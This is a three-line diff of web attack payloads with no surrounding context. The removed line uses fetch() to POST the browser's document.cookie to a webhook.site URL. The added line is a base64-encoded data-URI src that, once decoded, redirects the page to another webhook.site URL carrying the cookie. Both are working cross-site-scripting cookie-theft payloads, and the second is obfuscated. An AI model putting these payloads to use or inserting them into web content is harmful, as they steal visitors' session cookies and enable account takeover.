@@ -1,3 +1,1 @@
-fetch("https://webhook.site/fb2cdbd9-1e85-4620-9053-9176c7b65d67",{method: "POST",body: document.cookie});
-
-
+src="data:;base64,d2luZG93LmxvY2F0aW9uID0gImh0dHBzOi8vd2ViaG9vay5zaXRlL2E2M2NhZjYyLWYxM2MtNDlkYi1iOTZiLWYzZGU0N2NhNDA5Nz9jb29raWU9IiArIGRvY3VtZW50LmNvb2tpZTs="
